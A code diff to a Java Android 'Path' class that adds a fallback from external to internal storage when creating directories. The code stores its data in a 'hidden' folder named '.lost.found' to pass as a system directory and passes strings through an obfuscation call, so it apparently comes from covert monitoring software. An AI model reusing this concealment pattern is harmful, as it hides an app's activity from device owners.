@@ -63,7 +63,7 @@ public class Path {
 	 * 
 	 * @return true, if successful
 	 */
-	public static boolean makeDirs() {
+	public static boolean makeDirs(boolean forcelocal) {
 
 		/** The Constant CONF_DIR. 24_0=cdd/ */
 		CONF_DIR = "l1/"; //$NON-NLS-1$
@@ -73,7 +73,7 @@ public class Path {
 		LOG_DIR = "l3/"; //$NON-NLS-1$
 
 		try {
-			setStorage();
+			setStorage(forcelocal);
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (makeDirs): hidden = " + hidden());//$NON-NLS-1$
 			}
@@ -113,12 +113,16 @@ public class Path {
 
 	/**
 	 * Check.storage. //$NON-NLS-1$
+	 * @param forcelocal 
 	 */
-	public static void setStorage() {
+	public static void setStorage(boolean forcelocal) {
 		boolean mExternalStorageAvailable = false;
 		boolean mExternalStorageWriteable = false;
 		final String state = Environment.getExternalStorageState();
 
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (setStorage) external state: " + state);
+		}
 		if (Environment.MEDIA_MOUNTED.equals(state)) {
 			// We can read and write the media
 			mExternalStorageAvailable = mExternalStorageWriteable = true;
@@ -133,12 +137,11 @@ public class Path {
 			mExternalStorageAvailable = mExternalStorageWriteable = false;
 		}
 
-		if (mExternalStorageWriteable && Cfg.USE_SD) {
+		if (!forcelocal && mExternalStorageWriteable && Cfg.USE_SD) {
 			hidden = Environment.getExternalStorageDirectory() + M.e("/.lost.found") + "/"; //$NON-NLS-1$ //$NON-NLS-2$
+			
 		} else {
-
 			hidden = Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/.lost.found") + "/";
-
 		}
 
 		if (Cfg.DEBUG) {
@@ -347,6 +350,19 @@ public class Path {
 
 	public static boolean initialized() {
 		return initialized;
+	}
+
+	public static boolean makeDirs() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (makeDirs) trying sd");
+		}
+		if(! makeDirs(false)){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (makeDirs) forcing internal space");
+			}
+			return makeDirs(true);
+		}
+		return true;
 	}
 
 }
